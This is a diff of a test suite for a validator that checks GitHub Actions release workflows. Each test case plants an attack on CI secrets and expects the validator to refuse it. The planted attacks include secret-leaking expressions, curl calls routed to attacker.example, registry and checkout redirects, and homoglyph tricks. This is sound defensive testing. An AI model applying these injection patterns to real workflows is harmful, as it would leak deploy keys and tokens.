   const PIN = /not its pinned expression/;
   const TEST = /credential DEPLOY_KEY outside its recorded position/;
   const CURL = /curl reaches only .*, exactly/;
-  it.each([
-    [
-      "E1 [ -n K -a -n K ]",
-      pre(
-        "publish-go",
-        "Install the deploy key",
-        '[ -n "$DEPLOY_KEY" -a -n "$DEPLOY_KEY" ] && echo y',
-      ),
-      TEST,
-    ],
-    [
-      "E2 [ -n K = abc ]",
-      pre("publish-go", "Install the deploy key", 'if [ -n "$DEPLOY_KEY" = abc ]; then echo y; fi'),
-      TEST,
-    ],
-    [
-      "E3 [ abc \\< -n -o -n K ]",
-      pre(
-        "publish-go",
-        "Install the deploy key",
-        'if [ abc \\< -n -o -n "$DEPLOY_KEY" ]; then echo y; fi',
-      ),
-      /backslash outside quotes|credential DEPLOY_KEY/,
-    ],
-    ["E4 [ K ]", pre("publish-go", "Install the deploy key", '[ "$DEPLOY_KEY" ] && echo y'), TEST],
-    [
-      "L10 [ -n K -a … ] in Upload",
-      pre("publish-go", "Upload", '[ -n "${DEPLOY_KEY}" -a -n "${DEPLOY_KEY}" ] && echo y'),
-      /credential DEPLOY_KEY outside|undefined|no env/,
-    ],
-    [
-      "L1 secrets['X'] in an allowed name",
-      at("publish-go", {
-        env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      INDEX,
-    ],
-    [
-      "L2 toJSON(secrets)",
-      at("publish-go", {
-        env: { DOTNET_NOLOGO: "${{ toJSON(secrets) }}" },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      FN,
-    ],
-    [
-      "L3 github['token']",
-      at("publish-go", {
-        env: { DOTNET_NOLOGO: "${{ github['token'] }}" },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      INDEX,
-    ],
-    [
-      "L3b toJSON(github)",
-      at("publish-go", {
-        env: { DOTNET_NOLOGO: "${{ toJSON(github) }}" },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      FN,
-    ],
-    [
-      "L8 format('{0}', secrets.X)",
-      at("publish-go", {
-        env: { CLOUDFLARE_ACCOUNT_ID: `\${{ format('{0}', secrets.${SECRET}) }}` },
-        run: 'echo "${CLOUDFLARE_ACCOUNT_ID}"',
-      }),
-      FN,
-    ],
-    [
-      "L9 a job env bracket",
-      (w) => {
-        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = `\${{ secrets['${SECRET}'] }}`;
-      },
-      INDEX,
-    ],
-    [
-      "M1 toJSON(secrets) as R2_ACCESS_KEY_ID",
-      (w) => {
-        w[P].jobs["publish-go"].env.R2_ACCESS_KEY_ID = "${{ toJSON(secrets) }}";
-      },
-      FN,
-    ],
-    [
-      "M2 github['token'] as CLOUDFLARE_ACCOUNT_ID",
-      at("publish-go", { env: { CLOUDFLARE_ACCOUNT_ID: "${{ github['token'] }}" }, run: "echo x" }),
-      INDEX,
-    ],
-    [
-      "M3 secrets[X] in packagist",
-      at("publish-packagist", {
-        env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      INDEX,
-    ],
-    [
-      "M4 steps['x'].outputs",
-      at("publish-go", {
-        env: { DOTNET_NOLOGO: "${{ steps['inj'].outputs.y }}" },
-        run: 'echo "${DOTNET_NOLOGO}"',
-      }),
-      INDEX,
-    ],
-    [
-      "M5 env['DEPLOY_KEY'] at job",
-      (w) => {
-        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ env['DEPLOY_KEY'] }}";
-      },
-      INDEX,
-    ],
-    [
-      "Q1 fromJSON(toJSON(secrets)).X into a tag",
-      at(
-        "publish-go",
-        {
-          env: { CLOUDFLARE_ACCOUNT_ID: "${{ fromJSON(toJSON(secrets)).SOME_ORG_SECRET }}" },
-          run: 'git push --atomic --end-of-options git@github.com:confeature/sdks.git "HEAD:refs/tags/${CLOUDFLARE_ACCOUNT_ID}"',
+  it.each(
+    ROWS.rows([
+      [
+        "E1 [ -n K -a -n K ]",
+        pre(
+          "publish-go",
+          "Install the deploy key",
+          '[ -n "$DEPLOY_KEY" -a -n "$DEPLOY_KEY" ] && echo y',
+        ),
+        TEST,
+      ],
+      [
+        "E2 [ -n K = abc ]",
+        pre(
+          "publish-go",
+          "Install the deploy key",
+          'if [ -n "$DEPLOY_KEY" = abc ]; then echo y; fi',
+        ),
+        TEST,
+      ],
+      [
+        "E3 [ abc \\< -n -o -n K ]",
+        pre(
+          "publish-go",
+          "Install the deploy key",
+          'if [ abc \\< -n -o -n "$DEPLOY_KEY" ]; then echo y; fi',
+        ),
+        /backslash outside quotes|credential DEPLOY_KEY/,
+      ],
+      [
+        "E4 [ K ]",
+        pre("publish-go", "Install the deploy key", '[ "$DEPLOY_KEY" ] && echo y'),
+        TEST,
+      ],
+      [
+        "L10 [ -n K -a … ] in Upload",
+        pre("publish-go", "Upload", '[ -n "${DEPLOY_KEY}" -a -n "${DEPLOY_KEY}" ] && echo y'),
+        /credential DEPLOY_KEY outside|undefined|no env/,
+      ],
+      [
+        "L1 secrets['X'] in an allowed name",
+        at("publish-go", {
+          env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        INDEX,
+      ],
+      [
+        "L2 toJSON(secrets)",
+        at("publish-go", {
+          env: { DOTNET_NOLOGO: "${{ toJSON(secrets) }}" },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        FN,
+      ],
+      [
+        "L3 github['token']",
+        at("publish-go", {
+          env: { DOTNET_NOLOGO: "${{ github['token'] }}" },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        INDEX,
+      ],
+      [
+        "L3b toJSON(github)",
+        at("publish-go", {
+          env: { DOTNET_NOLOGO: "${{ toJSON(github) }}" },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        FN,
+      ],
+      [
+        "L8 format('{0}', secrets.X)",
+        at("publish-go", {
+          env: { CLOUDFLARE_ACCOUNT_ID: `\${{ format('{0}', secrets.${SECRET}) }}` },
+          run: 'echo "${CLOUDFLARE_ACCOUNT_ID}"',
+        }),
+        FN,
+      ],
+      [
+        "L9 a job env bracket",
+        (w) => {
+          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = `\${{ secrets['${SECRET}'] }}`;
         },
-        3,
-      ),
-      FN,
-    ],
-    [
-      "Q3 github['token'] in the Upload job's env",
-      (w) => {
-        w[P].jobs["publish-go"].env.CLOUDFLARE_ACCOUNT_ID = "${{ github['token'] }}";
-      },
-      INDEX,
-    ],
-    [
-      "Q4 packagist Upload: fromJSON(toJSON(secrets)).X",
-      (w) => {
-        w[P].jobs["publish-packagist"].steps.find(
-          (s) => s.name === "Upload",
-        ).env.CLOUDFLARE_ACCOUNT_ID = "${{ fromJSON(toJSON(secrets)).X }}";
-      },
-      FN,
-    ],
-    [
-      "R1 needs['x'] (rule 16)",
-      (w) => {
-        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ needs['nosuchjob'].outputs.nothing }}";
-      },
-      INDEX,
-    ],
-    [
-      "a literal value for an allowed name",
-      (w) => {
-        w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "0";
-      },
-      PIN,
-    ],
-    [
-      "a secret in a name pinned to a literal",
-      (w) => {
-        w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "${{ secrets.MIRROR_DEPLOY_KEY }}";
-      },
-      PIN,
-    ],
-    [
-      "another pack job's artifact name",
-      (w) => {
-        w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-pypi.outputs.file }}";
-      },
-      PIN,
-    ],
-    [
-      "a bare context",
-      (w) => {
-        w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ secrets }}";
-      },
-      /the bare secrets context/,
-    ],
-    [
-      "L4 ../ out of the module",
-      at("publish-go", {
-        run: `curl -fsS --proto =https "${PFX}../../../../../../attacker.example/x/@v/list"`,
-      }),
-      CURL,
-    ],
-    [
-      "L4c a query",
-      at("publish-go", { run: `curl -fsS --proto =https "${PFX}v1.info?x=1"` }),
-      CURL,
-    ],
-    [
-      "L4d %2e",
-      at("publish-go", { run: `curl -fsS --proto =https "${PFX}%2e%2e/%2e%2e/x"` }),
-      CURL,
-    ],
-    [
-      "L4e @ userinfo",
-      at("publish-go", { run: `curl -fsS --proto =https "${PFX}@attacker.example/"` }),
-      CURL,
-    ],
-    [
-      "the module's list, not its version",
-      at("publish-go", { run: `curl -fsS --proto =https "${PFX}list"` }),
-      CURL,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+        INDEX,
+      ],
+      [
+        "M1 toJSON(secrets) as R2_ACCESS_KEY_ID",
+        (w) => {
+          w[P].jobs["publish-go"].env.R2_ACCESS_KEY_ID = "${{ toJSON(secrets) }}";
+        },
+        FN,
+      ],
+      [
+        "M2 github['token'] as CLOUDFLARE_ACCOUNT_ID",
+        at("publish-go", {
+          env: { CLOUDFLARE_ACCOUNT_ID: "${{ github['token'] }}" },
+          run: "echo x",
+        }),
+        INDEX,
+      ],
+      [
+        "M3 secrets[X] in packagist",
+        at("publish-packagist", {
+          env: { DOTNET_NOLOGO: `\${{ secrets['${SECRET}'] }}` },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        INDEX,
+      ],
+      [
+        "M4 steps['x'].outputs",
+        at("publish-go", {
+          env: { DOTNET_NOLOGO: "${{ steps['inj'].outputs.y }}" },
+          run: 'echo "${DOTNET_NOLOGO}"',
+        }),
+        INDEX,
+      ],
+      [
+        "M5 env['DEPLOY_KEY'] at job",
+        (w) => {
+          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ env['DEPLOY_KEY'] }}";
+        },
+        INDEX,
+      ],
+      [
+        "Q1 fromJSON(toJSON(secrets)).X into a tag",
+        at(
+          "publish-go",
+          {
+            env: { CLOUDFLARE_ACCOUNT_ID: "${{ fromJSON(toJSON(secrets)).SOME_ORG_SECRET }}" },
+            run: 'git push --atomic --end-of-options git@github.com:confeature/sdks.git "HEAD:refs/tags/${CLOUDFLARE_ACCOUNT_ID}"',
+          },
+          3,
+        ),
+        FN,
+      ],
+      [
+        "Q3 github['token'] in the Upload job's env",
+        (w) => {
+          w[P].jobs["publish-go"].env.CLOUDFLARE_ACCOUNT_ID = "${{ github['token'] }}";
+        },
+        INDEX,
+      ],
+      [
+        "Q4 packagist Upload: fromJSON(toJSON(secrets)).X",
+        (w) => {
+          w[P].jobs["publish-packagist"].steps.find(
+            (s) => s.name === "Upload",
+          ).env.CLOUDFLARE_ACCOUNT_ID = "${{ fromJSON(toJSON(secrets)).X }}";
+        },
+        FN,
+      ],
+      [
+        "R1 needs['x'] (rule 16)",
+        (w) => {
+          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ needs['nosuchjob'].outputs.nothing }}";
+        },
+        INDEX,
+      ],
+      [
+        "a literal value for an allowed name",
+        (w) => {
+          w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "0";
+        },
+        PIN,
+      ],
+      [
+        "a secret in a name pinned to a literal",
+        (w) => {
+          w[P].jobs["publish-nuget"].env.DOTNET_NOLOGO = "${{ secrets.MIRROR_DEPLOY_KEY }}";
+        },
+        PIN,
+      ],
+      [
+        "another pack job's artifact name",
+        (w) => {
+          w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-pypi.outputs.file }}";
+        },
+        PIN,
+      ],
+      [
+        "a bare context",
+        (w) => {
+          w[P].jobs["publish-go"].env.DOTNET_NOLOGO = "${{ secrets }}";
+        },
+        /the bare secrets context/,
+      ],
+      [
+        "L4 ../ out of the module",
+        at("publish-go", {
+          run: `curl -fsS --proto =https "${PFX}../../../../../../attacker.example/x/@v/list"`,
+        }),
+        CURL,
+      ],
+      [
+        "L4c a query",
+        at("publish-go", { run: `curl -fsS --proto =https "${PFX}v1.info?x=1"` }),
+        CURL,
+      ],
+      [
+        "L4d %2e",
+        at("publish-go", { run: `curl -fsS --proto =https "${PFX}%2e%2e/%2e%2e/x"` }),
+        CURL,
+      ],
+      [
+        "L4e @ userinfo",
+        at("publish-go", { run: `curl -fsS --proto =https "${PFX}@attacker.example/"` }),
+        CURL,
+      ],
+      [
+        "the module's list, not its version",
+        at("publish-go", { run: `curl -fsS --proto =https "${PFX}list"` }),
+        CURL,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -902,49 +928,52 @@ describe("16 a step output reference names an output the step writes (round 6)",
 });
 
 describe("16 reads the workflow env, secrets, vars and matrix too (round 6)", () => {
-  it.each([
-    [
-      "a secret the job's environment does not declare",
-      (w) => {
-        w[P].jobs["publish-go"].steps.find(
-          (s) => s.name === "Install the deploy key",
-        ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
-      },
-      /environment sdk-publish-go declares no secret MIRROR_DEPLOY_KEY/,
-    ],
-    [
-      "a secret in a job outside an environment",
-      (w) => {
-        w[P].jobs.setup.steps.find((s) => s.id === "resolve").env.UNIT =
-          "${{ secrets.GO_TAG_DEPLOY_KEY }}";
-      },
-      /a job outside an environment declares no secret GO_TAG_DEPLOY_KEY/,
-    ],
-    [
-      "a variable nobody recorded",
-      (w) => {
-        w[P].jobs["publish-nuget"].steps.find((s) => s.uses?.startsWith("NuGet/login")).with.user =
-          "${{ vars.OTHER }}";
-      },
-      /RELEASE_VARS records no variable OTHER/,
-    ],
-    [
-      "a matrix reference",
-      (w) => {
-        w[P].jobs["pack-npm"].env.UNIT_VERSION = "${{ matrix.version }}";
-      },
-      /the release workflows use no matrix/,
-    ],
-    [
-      "the workflow env reading a job's output",
-      (w) => {
-        w[P].env.EXTRA = "${{ needs.setup.outputs.path }}";
-      },
-      /the workflow's env cannot read the needs context/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "a secret the job's environment does not declare",
+        (w) => {
+          w[P].jobs["publish-go"].steps.find(
+            (s) => s.name === "Install the deploy key",
+          ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
+        },
+        /environment sdk-publish-go declares no secret MIRROR_DEPLOY_KEY/,
+      ],
+      [
+        "a secret in a job outside an environment",
+        (w) => {
+          w[P].jobs.setup.steps.find((s) => s.id === "resolve").env.UNIT =
+            "${{ secrets.GO_TAG_DEPLOY_KEY }}";
+        },
+        /a job outside an environment declares no secret GO_TAG_DEPLOY_KEY/,
+      ],
+      [
+        "a variable nobody recorded",
+        (w) => {
+          w[P].jobs["publish-nuget"].steps.find((s) =>
+            s.uses?.startsWith("NuGet/login"),
+          ).with.user = "${{ vars.OTHER }}";
+        },
+        /RELEASE_VARS records no variable OTHER/,
+      ],
+      [
+        "a matrix reference",
+        (w) => {
+          w[P].jobs["pack-npm"].env.UNIT_VERSION = "${{ matrix.version }}";
+        },
+        /the release workflows use no matrix/,
+      ],
+      [
+        "the workflow env reading a job's output",
+        (w) => {
+          w[P].env.EXTRA = "${{ needs.setup.outputs.path }}";
+        },
+        /the workflow's env cannot read the needs context/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -954,59 +983,61 @@ describe("16 reads the workflow env, secrets, vars and matrix too (round 6)", ()
 
 describe("expressions are read as GitHub reads them: case-folded, with their strings (round 7)", () => {
   const resolveEnv = (w) => w[P].jobs.setup.steps.find((s) => s.id === "resolve").env;
-  it.each([
-    [
-      "TOJSON(SECRETS) in upper case",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ TOJSON(SECRETS) }}";
-      },
-      /toJSON, fromJSON, format and join are refused/,
-    ],
-    [
-      "SECRETS.X in upper case, outside an environment",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ SECRETS.GO_TAG_DEPLOY_KEY }}";
-      },
-      /reads the secrets context outside an environment/,
-    ],
-    [
-      "GITHUB.TOKEN in upper case",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ GITHUB.TOKEN }}";
-      },
-      /write the context in lower case/,
-    ],
-    [
-      "a `}}` inside a string hiding toJSON(secrets)",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ ('}}' && '') || toJSON(secrets) }}";
-      },
-      /toJSON, fromJSON, format and join are refused/,
-    ],
-    [
-      "a '' escape inside the string",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ ('it''s }}' && '') || toJSON(secrets) }}";
-      },
-      /toJSON, fromJSON, format and join are refused/,
-    ],
-    [
-      "a non-ASCII letter (Cyrillic s) in a context name",
-      (w) => {
-        resolveEnv(w).UNIT = "${{ ѕecrets.X }}";
-      },
-      /a non-ASCII character in an expression/,
-    ],
-    [
-      "an if: reading SECRETS outside an environment",
-      (w) => {
-        w[P].jobs.setup.steps.find((s) => s.id === "resolve").if = "contains(SECRETS.X, 'a')";
-      },
-      /reads the secrets context outside an environment/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "TOJSON(SECRETS) in upper case",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ TOJSON(SECRETS) }}";
+        },
+        /toJSON, fromJSON, format and join are refused/,
+      ],
+      [
+        "SECRETS.X in upper case, outside an environment",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ SECRETS.GO_TAG_DEPLOY_KEY }}";
+        },
+        /reads the secrets context outside an environment/,
+      ],
+      [
+        "GITHUB.TOKEN in upper case",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ GITHUB.TOKEN }}";
+        },
+        /write the context in lower case/,
+      ],
+      [
+        "a `}}` inside a string hiding toJSON(secrets)",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ ('}}' && '') || toJSON(secrets) }}";
+        },
+        /toJSON, fromJSON, format and join are refused/,
+      ],
+      [
+        "a '' escape inside the string",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ ('it''s }}' && '') || toJSON(secrets) }}";
+        },
+        /toJSON, fromJSON, format and join are refused/,
+      ],
+      [
+        "a non-ASCII letter (Cyrillic s) in a context name",
+        (w) => {
+          resolveEnv(w).UNIT = "${{ ѕecrets.X }}";
+        },
+        /a non-ASCII character in an expression/,
+      ],
+      [
+        "an if: reading SECRETS outside an environment",
+        (w) => {
+          w[P].jobs.setup.steps.find((s) => s.id === "resolve").if = "contains(SECRETS.X, 'a')";
+        },
+        /reads the secrets context outside an environment/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -1028,108 +1059,110 @@ describe("expressions are read as GitHub reads them: case-folded, with their str
 
 describe("a credential is readable only by a run: block (round 7, HIGH)", () => {
   const upload = (w) => w[C].jobs.upload.steps.find((s) => s.env?.R2_SECRET_ACCESS_KEY);
-  it.each([
-    [
-      "a step if: leaking a bit of R2_SECRET_ACCESS_KEY",
-      (w) => {
-        upload(w).if = "${{ startsWith(env.R2_SECRET_ACCESS_KEY, '0') }}";
-      },
-      /if: .* is not a recorded condition/,
-    ],
-    [
-      "the same if: written bare",
-      (w) => {
-        upload(w).if = "startsWith(env.R2_SECRET_ACCESS_KEY, '0')";
-      },
-      /the credential R2_SECRET_ACCESS_KEY is read only by a run: block/,
-    ],
-    [
-      "continue-on-error from a secret",
-      (w) => {
-        upload(w)["continue-on-error"] = "${{ secrets.R2_SECRET_ACCESS_KEY == 'x' }}";
-      },
-      /continue-on-error: holds an expression|a secret is read only in an env: value/,
-    ],
-    [
-      "timeout-minutes from a secret",
-      (w) => {
-        upload(w)["timeout-minutes"] = "${{ secrets.R2_SECRET_ACCESS_KEY }}";
-      },
-      /timeout-minutes: holds an expression/,
-    ],
-    [
-      "a step name carrying the value",
-      (w) => {
-        upload(w).name = "Upload ${{ env.R2_SECRET_ACCESS_KEY }}";
-      },
-      /name: holds an expression/,
-    ],
-    [
-      "a with: carrying a secret",
-      (w) => {
-        const d = w[C].jobs.upload.steps.find((s) =>
-          String(s.uses).startsWith("actions/download-artifact"),
-        );
-        d.with = { ...d.with, name: "${{ secrets.R2_SECRET_ACCESS_KEY }}" };
-      },
-      /a secret is read only in an env: value/,
-    ],
-    [
-      "F1 environment.url from a job-level credential",
-      (w) => {
-        const j = w[C].jobs.upload;
-        const s = upload(w);
-        j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
-        delete s.env.R2_SECRET_ACCESS_KEY;
-        j.environment = {
-          name: "cli-release",
-          url: "https://example.com/${{ env.R2_SECRET_ACCESS_KEY }}",
-        };
-      },
-      /environment: is a literal name/,
-    ],
-    [
-      "A11/E1 a credential moved to the job env",
-      (w) => {
-        const j = w[C].jobs.upload;
-        const s = upload(w);
-        j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
-        delete s.env.R2_SECRET_ACCESS_KEY;
-      },
-      /the credential R2_SECRET_ACCESS_KEY is set in the job's env/,
-    ],
-    [
-      "a credential set on a step whose run: does not read it",
-      (w) => {
-        const s = w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload");
-        s.env = { ...s.env, DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
-      },
-      /step Upload sets the credential DEPLOY_KEY but its run: does not read it/,
-    ],
-    [
-      "F3 an upper-case if: on the upload step",
-      (w) => {
-        upload(w).if = "contains(TOJSON(SECRETS), 'a')";
-      },
-      /is not a recorded condition|toJSON, fromJSON, format and join are refused/,
-    ],
-    [
-      "a job if: reading env",
-      (w) => {
-        w[P].jobs["publish-npm"].if += " && env.NPM_VERSION != ''";
-      },
-      /a credentialed job's if: reads more than needs\. and github\./,
-    ],
-    [
-      "a job timeout from an expression",
-      (w) => {
-        w[P].jobs["publish-npm"]["timeout-minutes"] = "${{ needs.setup.outputs.version }}";
-      },
-      /a credentialed job's timeout-minutes: holds an expression/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "a step if: leaking a bit of R2_SECRET_ACCESS_KEY",
+        (w) => {
+          upload(w).if = "${{ startsWith(env.R2_SECRET_ACCESS_KEY, '0') }}";
+        },
+        /if: .* is not a recorded condition/,
+      ],
+      [
+        "the same if: written bare",
+        (w) => {
+          upload(w).if = "startsWith(env.R2_SECRET_ACCESS_KEY, '0')";
+        },
+        /the credential R2_SECRET_ACCESS_KEY is read only by a run: block/,
+      ],
+      [
+        "continue-on-error from a secret",
+        (w) => {
+          upload(w)["continue-on-error"] = "${{ secrets.R2_SECRET_ACCESS_KEY == 'x' }}";
+        },
+        /continue-on-error: holds an expression|a secret is read only in an env: value/,
+      ],
+      [
+        "timeout-minutes from a secret",
+        (w) => {
+          upload(w)["timeout-minutes"] = "${{ secrets.R2_SECRET_ACCESS_KEY }}";
+        },
+        /timeout-minutes: holds an expression/,
+      ],
+      [
+        "a step name carrying the value",
+        (w) => {
+          upload(w).name = "Upload ${{ env.R2_SECRET_ACCESS_KEY }}";
+        },
+        /name: holds an expression/,
+      ],
+      [
+        "a with: carrying a secret",
+        (w) => {
+          const d = w[C].jobs.upload.steps.find((s) =>
+            String(s.uses).startsWith("actions/download-artifact"),
+          );
+          d.with = { ...d.with, name: "${{ secrets.R2_SECRET_ACCESS_KEY }}" };
+        },
+        /a secret is read only in an env: value/,
+      ],
+      [
+        "F1 environment.url from a job-level credential",
+        (w) => {
+          const j = w[C].jobs.upload;
+          const s = upload(w);
+          j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
+          delete s.env.R2_SECRET_ACCESS_KEY;
+          j.environment = {
+            name: "cli-release",
+            url: "https://example.com/${{ env.R2_SECRET_ACCESS_KEY }}",
+          };
+        },
+        /environment: is a literal name/,
+      ],
+      [
+        "A11/E1 a credential moved to the job env",
+        (w) => {
+          const j = w[C].jobs.upload;
+          const s = upload(w);
+          j.env = { ...(j.env ?? {}), R2_SECRET_ACCESS_KEY: s.env.R2_SECRET_ACCESS_KEY };
+          delete s.env.R2_SECRET_ACCESS_KEY;
+        },
+        /the credential R2_SECRET_ACCESS_KEY is set in the job's env/,
+      ],
+      [
+        "a credential set on a step whose run: does not read it",
+        (w) => {
+          const s = w[P].jobs["publish-go"].steps.find((x) => x.name === "Upload");
+          s.env = { ...s.env, DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
+        },
+        /step Upload sets the credential DEPLOY_KEY but its run: does not read it/,
+      ],
+      [
+        "F3 an upper-case if: on the upload step",
+        (w) => {
+          upload(w).if = "contains(TOJSON(SECRETS), 'a')";
+        },
+        /is not a recorded condition|toJSON, fromJSON, format and join are refused/,
+      ],
+      [
+        "a job if: reading env",
+        (w) => {
+          w[P].jobs["publish-npm"].if += " && env.NPM_VERSION != ''";
+        },
+        /a credentialed job's if: reads more than needs\. and github\./,
+      ],
+      [
+        "a job timeout from an expression",
+        (w) => {
+          w[P].jobs["publish-npm"]["timeout-minutes"] = "${{ needs.setup.outputs.version }}";
+        },
+        /a credentialed job's timeout-minutes: holds an expression/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -1153,35 +1186,37 @@ describe("a credential is readable only by a run: block (round 7, HIGH)", () => 
 });
 
 describe("each secret name reads its own secret (round 7)", () => {
-  it.each([
-    [
-      "MAVEN_R2_ACCESS_KEY_ID from another declared secret",
-      (w) => {
-        w[P].jobs["publish-maven"].steps.find(
-          (s) => s.name === "Upload",
-        ).env.MAVEN_R2_ACCESS_KEY_ID = "${{ secrets.MAVEN_R2_SECRET_ACCESS_KEY }}";
-      },
-      /MAVEN_R2_ACCESS_KEY_ID is .*, not its pinned expression/,
-    ],
-    [
-      "the Go DEPLOY_KEY from the mirrors' secret",
-      (w) => {
-        w[P].jobs["publish-go"].steps.find(
-          (s) => s.name === "Install the deploy key",
-        ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
-      },
-      /DEPLOY_KEY is \$\{\{ secrets\.MIRROR_DEPLOY_KEY \}\}, not its pinned expression/,
-    ],
-    [
-      "another known host",
-      (w) => {
-        w[P].env.GITHUB_SSH_KNOWN_HOST = "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL";
-      },
-      /GITHUB_SSH_KNOWN_HOST is .*, not its pinned expression/,
-    ],
-  ])("refuses %s", (label, mutate, why) => {
+  it.each(
+    ROWS.rows([
+      [
+        "MAVEN_R2_ACCESS_KEY_ID from another declared secret",
+        (w) => {
+          w[P].jobs["publish-maven"].steps.find(
+            (s) => s.name === "Upload",
+          ).env.MAVEN_R2_ACCESS_KEY_ID = "${{ secrets.MAVEN_R2_SECRET_ACCESS_KEY }}";
+        },
+        /MAVEN_R2_ACCESS_KEY_ID is .*, not its pinned expression/,
+      ],
+      [
+        "the Go DEPLOY_KEY from the mirrors' secret",
+        (w) => {
+          w[P].jobs["publish-go"].steps.find(
+            (s) => s.name === "Install the deploy key",
+          ).env.DEPLOY_KEY = "${{ secrets.MIRROR_DEPLOY_KEY }}";
+        },
+        /DEPLOY_KEY is \$\{\{ secrets\.MIRROR_DEPLOY_KEY \}\}, not its pinned expression/,
+      ],
+      [
+        "another known host",
+        (w) => {
+          w[P].env.GITHUB_SSH_KNOWN_HOST = "github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL";
+        },
+        /GITHUB_SSH_KNOWN_HOST is .*, not its pinned expression/,
+      ],
+    ]),
+  )("refuses %s", (label, mutate, why) => {
     const got = added(mutate);
-    expectCount(label, got);
+    expectFindings(label, got);
     expect(
       got.some((g) => why.test(g)),
       got.join("\n") || "no finding",
@@ -1195,209 +1230,211 @@ describe("17 every credentialed job's action surface is frozen (round 8)", () =>
   const S = (w, f, id, pred) => j(w, f, id).steps.find(pred);
   const uses = (prefix) => (s) => String(s.uses).startsWith(prefix);
   const SURFACE = /ACTION_SURFACE records/;
-  it.each([
-    [
-      "C1 pypi repository-url to an attacker",
-      (w) => {
-        S(w, P_, "publish-pypi", uses("pypa/")).with["repository-url"] =
-          "https://attacker.example/legacy/";
-      },
-      SURFACE,
-    ],
-    [
-      "C2 rubygems gem-server to an attacker",
-      (w) => {
-        const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
-        s.with = { ...(s.with ?? {}), "gem-server": "https://attacker.example" };
-      },
-      SURFACE,
-    ],
-    [
-      "C2b rubygems audience override",
-      (w) => {
-        const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
-        s.with = { ...(s.with ?? {}), audience: "attacker.example" };
-      },
-      SURFACE,
-    ],
-    [
-      "C3 maven checkout of another repository",
-      (w) => {
-        const s = S(w, P_, "publish-maven", uses("actions/checkout"));
-        s.with.repository = "attacker/evil";
-        s.with.ref = "main";
-      },
-      SURFACE,
-    ],
-    [
-      "C4 cli upload checkout of another repository",
-      (w) => {
-        S(w, C, "upload", uses("actions/checkout")).with.repository = "attacker/evil";
-      },
-      SURFACE,
-    ],
-    [
-      "C4b cli promote checkout of a pull request",
-      (w) => {
-        S(w, C, "promote", uses("actions/checkout")).with.ref = "refs/pull/1/head";
-      },
-      SURFACE,
-    ],
-    [
-      "C5 crates checkout of a pull request",
